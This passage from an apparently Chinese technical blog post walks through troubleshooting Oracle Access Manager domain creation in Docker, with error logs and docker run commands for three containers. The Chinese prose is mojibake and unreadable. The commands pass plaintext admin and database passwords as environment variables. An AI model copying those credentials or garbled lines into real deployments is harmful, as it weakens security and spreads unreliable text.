</span></span><span style=display:flex><span>INFO: sys.argv[17] = -rcuSchemaPwd
</span></span><span style=display:flex><span>INFO: sys.argv[18] = password
</span></span><span style=display:flex><span>INFO: sys.argv[19] = -isSSLEnabled
</span></span><span style=display:flex><span>INFO: sys.argv[20] = true
</span></span><span style=display:flex><span>INFO: Creating Admin server...
</span></span><span style=display:flex><span>INFO: Enabling SSL PORT for AdminServer...
</span></span><span style=display:flex><span>Error: set() failed. Do dumpStack() to see details.
</span></span><span style=display:flex><span>Error: runCmd() failed. Do dumpStack() to see details.
</span></span><span style=display:flex><span>Problem invoking WLST - Traceback (innermost last):
</span></span><span style=display:flex><span>  File &#34;/u01/oracle/dockertools/create_domain.py&#34;, line 513, in ?
</span></span><span style=display:flex><span>  File &#34;/u01/oracle/dockertools/create_domain.py&#34;, line 123, in createOAMDomain
</span></span><span style=display:flex><span>  File &#34;/u01/oracle/dockertools/create_domain.py&#34;, line 184, in createBaseDomain
</span></span><span style=display:flex><span>  File &#34;/tmp/WLSTOfflineIni5785928536971827845.py&#34;, line 79, in set
</span></span><span style=display:flex><span>  File &#34;/tmp/WLSTOfflineIni5785928536971827845.py&#34;, line 19, in command
</span></span><span style=display:flex><span>	at com.oracle.cie.domain.script.jython.CommandExceptionHandler.handleException(CommandExceptionHandler.java:69)
</span></span><span style=display:flex><span>	at com.oracle.cie.domain.script.jython.WLScriptContext.handleException(WLScriptContext.java:3085)
</span></span><span style=display:flex><span>	at com.oracle.cie.domain.script.jython.WLScriptContext.runCmd(WLScriptContext.java:738)
</span></span><span style=display:flex><span>	at sun.reflect.GeneratedMethodAccessor132.invoke(Unknown Source)
</span></span><span style=display:flex><span>	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
</span></span><span style=display:flex><span>	at java.lang.reflect.Method.invoke(Method.java:498)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>com.oracle.cie.domain.script.jython.WLSTException: com.oracle.cie.domain.script.jython.WLSTException
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Domain Creation Failed.. Please check the Domain Logs
</span></span></code></pre></td></tr></table></div></div><p>å¯ä»¥ä»48è¡Œçœ‹åˆ°æ˜¯åœ¨ <code>Creating Admin server...</code> é˜¶æ®µå‡ºé”™çš„ã€‚</p><h4 id=è§£å†³å››æé«˜admin_password-å¯†ç å¤æ‚åº¦>è§£å†³å››ï¼šæé«˜<code>ADMIN_PASSWORD</code> å¯†ç å¤æ‚åº¦<a hidden class=anchor aria-hidden=true href=#è§£å†³å››æé«˜admin_password-å¯†ç å¤æ‚åº¦>#</a></h4><p>éœ€è¦æ³¨æ„çš„æ˜¯æ¯æ¬¡å¤±è´¥é‡è¯•ä¹‹å‰è¦å…ˆåˆ é™¤ä¹‹å‰ç•™ä¸‹çš„ç—•è¿¹ã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-32-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-32-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-32-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-32-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>sudo docker rm oamadmin
</span></span><span style=display:flex><span>sudo rm -rf /scratch/user_projects/*
</span></span></code></pre></td></tr></table></div></div><p>ä»è¿™é‡Œ <a href=https://github.com/oracle/docker-images/issues/844#issuecomment-389884511>https://github.com/oracle/docker-images/issues/844#issuecomment-389884511</a> çœ‹åˆ°å¯èƒ½æ˜¯å¯†ç å¤æ‚åº¦ä¸å¤Ÿï¼Œå¯¼è‡´æ— æ³•è®¾ç½®å¯†ç ã€‚</p><p>å¯åŠ¨å®¹å™¨çš„å‘½ä»¤æ”¹ä¸ºä»¥ä¸‹ã€‚å°†å…¶ä¸­ <code>ADMIN_PASSWORD</code> å’Œ <code>DB_SCHEMA_PASSWORD</code> çš„å¤æ‚åº¦å˜é«˜ã€‚</p><p>å…¶ä¸­<code>ADMIN_PASSWORD</code> åº”è¯¥æ˜¯weblogicç®¡ç†å°çš„å¯†ç ã€‚<code>DB_SCHEMA_PASSWORD</code> æ˜¯ <code>password you want to set for the RCU schemas</code> ã€‚</p><p>é‚£ä¹ˆä»€ä¹ˆæ˜¯<code>RCU schemas</code> å‘¢ï¼Ÿä»€ä¹ˆæ˜¯RCUå‘¢ï¼Ÿä¸å¤ªç†è§£ï¼Œå…ˆè·³è¿‡ã€‚</p><blockquote><p>Repository Creation Utility is a graphical and CLI-based tool used to create and manage Oracle Fusion Middleware database schemas.</p></blockquote><p>æ”¹è¿›ä¸¤ä¸ªå¯†ç çš„å¤æ‚åº¦é‡æ–°åˆ›å»ºå®¹å™¨ã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo docker run -d --network<span style=color:#f92672>=</span>OamNET -p 7001:7001 --name<span style=color:#f92672>=</span>oamadmin --env CONNECTION_STRING<span style=color:#f92672>=</span>172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env RCUPREFIX<span style=color:#f92672>=</span>OAM1 --env DB_USER<span style=color:#f92672>=</span>sys --env DB_PASSWORD<span style=color:#f92672>=</span>Oradoc_db1 --env DB_SCHEMA_PASSWORD<span style=color:#f92672>=</span>Dbsch3m@ -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0
</span></span></code></pre></td></tr></table></div></div><p>å¹¶ä½¿ç”¨ <code>sudo docker logs -ft oamadmin </code>æŸ¥çœ‹æ–°å»ºè¿‡ç¨‹æ‰“å°å‡ºæ¥çš„æ—¥å¿—ï¼Œçœ‹åˆ°é—®é¢˜å¾—åˆ°äº†è§£å†³ã€‚</p><h4 id=æŠ¥é”™äº”åˆ›å»ºdomainå¤±è´¥>æŠ¥é”™äº”ï¼šåˆ›å»ºdomainå¤±è´¥<a hidden class=anchor aria-hidden=true href=#æŠ¥é”™äº”åˆ›å»ºdomainå¤±è´¥>#</a></h4><p>å¯ä»¥çœ‹åˆ°å‰å‡ ä¸ªæ­¥éª¤éƒ½é¡ºåˆ©å®Œæˆäº†ï¼Œä½†ä¹Ÿå‡ºç°äº†æ–°çš„é—®é¢˜ã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-41>41</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>ç±»ä¼¼å‰æ–‡æ—¥å¿—
</span></span><span style=display:flex><span>INFO: Creating Admin server...
</span></span><span style=display:flex><span>INFO: Enabling SSL PORT for AdminServer...
</span></span><span style=display:flex><span>Creating Node Managers...
</span></span><span style=display:flex><span>Will create Base domain at /u01/oracle/user_projects/domains/access_domain
</span></span><span style=display:flex><span>Writing base domain...
</span></span><span style=display:flex><span>Base domain created at /u01/oracle/user_projects/domains/access_domain
</span></span><span style=display:flex><span>Extending domain at /u01/oracle/user_projects/domains/access_domain
</span></span><span style=display:flex><span>Database  172.17.0.1:1521/ORCLPDB1.localdomain
</span></span><span style=display:flex><span>Apply Extension templates
</span></span><span style=display:flex><span>Extension Templates added
</span></span><span style=display:flex><span>Extension Templates added
</span></span><span style=display:flex><span>Deleting oam_server1
</span></span><span style=display:flex><span>The default oam_server1 coming from the oam extension template deleted
</span></span><span style=display:flex><span>Deleting oam_policy_mgr1
</span></span><span style=display:flex><span>The default oam_server1 coming from the oam extension template deleted
</span></span><span style=display:flex><span>Configuring JDBC Templates ...
</span></span><span style=display:flex><span>Configuring the Service Table DataSource...
</span></span><span style=display:flex><span>fmwDatabase  jdbc:oracle:thin:@172.17.0.1:1521/ORCLPDB1.localdomain
</span></span><span style=display:flex><span>Getting Database Defaults...
</span></span><span style=display:flex><span>Error: getDatabaseDefaults() failed. Do dumpStack() to see details.
</span></span><span style=display:flex><span>Error: runCmd() failed. Do dumpStack() to see details.
</span></span><span style=display:flex><span>Problem invoking WLST - Traceback (innermost last):
</span></span><span style=display:flex><span>  File &#34;/u01/oracle/dockertools/create_domain.py&#34;, line 513, in ?
</span></span><span style=display:flex><span>  File &#34;/u01/oracle/dockertools/create_domain.py&#34;, line 124, in createOAMDomain
</span></span><span style=display:flex><span>  File &#34;/u01/oracle/dockertools/create_domain.py&#34;, line 328, in extendOamDomain
</span></span><span style=display:flex><span>  File &#34;/u01/oracle/dockertools/create_domain.py&#34;, line 259, in configureJDBCTemplates
</span></span><span style=display:flex><span>  File &#34;/tmp/WLSTOfflineIni7074819690261705056.py&#34;, line 267, in getDatabaseDefaults
</span></span><span style=display:flex><span>  File &#34;/tmp/WLSTOfflineIni7074819690261705056.py&#34;, line 19, in command
</span></span><span style=display:flex><span>Failed to build JDBC Connection object: 
</span></span><span style=display:flex><span>	at com.oracle.cie.domain.script.jython.CommandExceptionHandler.handleException(CommandExceptionHandler.java:69)
</span></span><span style=display:flex><span>	at com.oracle.cie.domain.script.jython.WLScriptContext.handleException(WLScriptContext.java:3085)
</span></span><span style=display:flex><span>	at com.oracle.cie.domain.script.jython.WLScriptContext.runCmd(WLScriptContext.java:738)
</span></span><span style=display:flex><span>	at sun.reflect.GeneratedMethodAccessor132.invoke(Unknown Source)
</span></span><span style=display:flex><span>	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
</span></span><span style=display:flex><span>	at java.lang.reflect.Method.invoke(Method.java:498)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>com.oracle.cie.domain.script.jython.WLSTException: com.oracle.cie.domain.script.jython.WLSTException: Got exception when auto configuring the schema component(s) with data obtained from shadow table: 
</span></span><span style=display:flex><span>Failed to build JDBC Connection object: 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Domain Creation Failed.. Please check the Domain Logs
</span></span></code></pre></td></tr></table></div></div><h4 id=è§£å†³äº”ä¿®æ”¹db_schema_password>è§£å†³äº”ï¼šä¿®æ”¹<code>DB_SCHEMA_PASSWORD</code><a hidden class=anchor aria-hidden=true href=#è§£å†³äº”ä¿®æ”¹db_schema_password>#</a></h4><p>ä»æ—¥å¿—çœ‹åˆ°æ˜¯åœ¨ <code>Getting Database Defaults...</code> é˜¶æ®µå‡ºç°çš„é—®é¢˜ï¼Œæœç´¢ <code>getDatabaseDefaults() failed. Do dumpStack() to see details.</code> å‘ç°<a href=https://github.com/oracle/docker-images/issues/1633>è¿™ä¸ªgithub issue</a>æœ‰è®¨è®ºã€‚</p><p>çœ‹åˆ°<a href=https://github.com/freneticdisc/oracle-fmw-tooling/issues/1#issuecomment-236911279>æœ‰äºº</a>è¯´æ˜¯ <code>schema password</code> çš„é—®é¢˜ï¼Œäºæ˜¯éšä¾¿æ”¹<code>DB_SCHEMA_PASSWORD</code> ï¼Œæ”¹æˆ<code>Oradoc_db1</code> è¿˜æ˜¯ä¸è¡Œï¼Œæ”¹æˆ<code>Oradoc_db2</code>å°±å¯ä»¥äº†ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› ğŸ˜“ä¸è§£</p><p><img loading=lazy src=image-20220319001023127.png alt=image-20220319001023127></p><p>æ€»ä¹‹å‘¢ï¼Œç”¨è¿™ä¸ªå‘½ä»¤ï¼Œå°±å¯ä»¥è·‘èµ·æ¥ä¸‰ä¸ªå®¹å™¨ä¸­çš„ç¬¬ä¸€ä¸ªäº†ï¼</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo docker run -d --network<span style=color:#f92672>=</span>OamNET -p 7001:7001 --name<span style=color:#f92672>=</span>oamadmin --env CONNECTION_STRING<span style=color:#f92672>=</span>172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env RCUPREFIX<span style=color:#f92672>=</span>OAM1 --env DB_USER<span style=color:#f92672>=</span>sys --env DB_PASSWORD<span style=color:#f92672>=</span>Oradoc_db1 --env DB_SCHEMA_PASSWORD<span style=color:#f92672>=</span>Oradoc_db2 -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0
</span></span></code></pre></td></tr></table></div></div><h4 id=æˆæœ>æˆæœ<a hidden class=anchor aria-hidden=true href=#æˆæœ>#</a></h4><p><img loading=lazy src=image-20220319001206652.png alt=image-20220319001206652></p><h2 id=åˆ›å»ºå®¹å™¨äºŒoamms>â‘£åˆ›å»ºå®¹å™¨äºŒoamms<a hidden class=anchor aria-hidden=true href=#åˆ›å»ºå®¹å™¨äºŒoamms>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo docker run -d -p 14100:14100 --network<span style=color:#f92672>=</span>OamNET --volumes-from oamadmin --name oamms --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env MANAGEDSERVER_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>14100</span> --env MANAGED_SERVER_CONTAINER<span style=color:#f92672>=</span>true --env MS_NAME<span style=color:#f92672>=</span>oam_server1 --env MS_HOST<span style=color:#f92672>=</span>oamms container-registry.oracle.com/middleware/oam:12.2.1.4.0 <span style=color:#e6db74>&#34;/u01/oracle/dockertools/startMS.sh&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220319002053797.png alt=image-20220319002053797></p><h2 id=åˆ›å»ºå®¹å™¨ä¸‰oampolicy>â‘¤åˆ›å»ºå®¹å™¨ä¸‰oampolicy<a hidden class=anchor aria-hidden=true href=#åˆ›å»ºå®¹å™¨ä¸‰oampolicy>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo docker run -d -p 15100:15100 --network<span style=color:#f92672>=</span>OamNET --volumes-from oamadmin --name oampolicy --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env MANAGEDSERVER_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>15100</span> --env MANAGED_SERVER_CONTAINER<span style=color:#f92672>=</span>true --env MS_NAME<span style=color:#f92672>=</span>oam_policy_mgr1 --env MS_HOST<span style=color:#f92672>=</span>oampolicy container-registry.oracle.com/middleware/oam:12.2.1.4.0 <span style=color:#e6db74>&#34;/u01/oracle/dockertools/startMS.sh&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220319002625756.png alt=image-20220319002625756></p><h2 id=éªŒè¯æœåŠ¡å¯ç”¨æ€§>â‘¥éªŒè¯æœåŠ¡å¯ç”¨æ€§<a hidden class=anchor aria-hidden=true href=#éªŒè¯æœåŠ¡å¯ç”¨æ€§>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo docker inspect -f <span style=color:#e6db74>&#39;{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}&#39;</span> oamadmin oamms oampolicy myOracleDB
